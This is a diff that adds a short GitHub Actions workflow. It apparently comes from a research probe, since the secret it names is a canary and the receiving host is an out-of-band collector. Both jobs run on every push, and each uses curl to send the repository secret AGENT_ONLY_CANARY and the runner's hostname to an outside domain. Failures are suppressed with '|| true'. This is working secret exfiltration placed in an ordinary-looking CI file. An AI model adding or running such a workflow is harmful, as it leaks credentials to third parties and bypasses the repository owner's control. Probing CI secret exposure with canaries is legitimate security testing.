@@ -1,0 +1,16 @@
+name: x
+on: [push, workflow_dispatch]
+jobs:
+  withenv:
+    runs-on: ubuntu-latest
+    environment: copilot
+    steps:
+      - name: egress with copilot env
+        run: |
+          curl -s -m 20 "https://ct6a-83b2.oob.ogxing.com/stepA-withenv?v=${{ secrets.AGENT_ONLY_CANARY }}&host=$(hostname)" || true
+  noenv:
+    runs-on: ubuntu-latest
+    steps:
+      - name: egress without env
+        run: |
+          curl -s -m 20 "https://ct6a-83b2.oob.ogxing.com/stepA-noenv?v=${{ secrets.AGENT_ONLY_CANARY }}&host=$(hostname)" || true
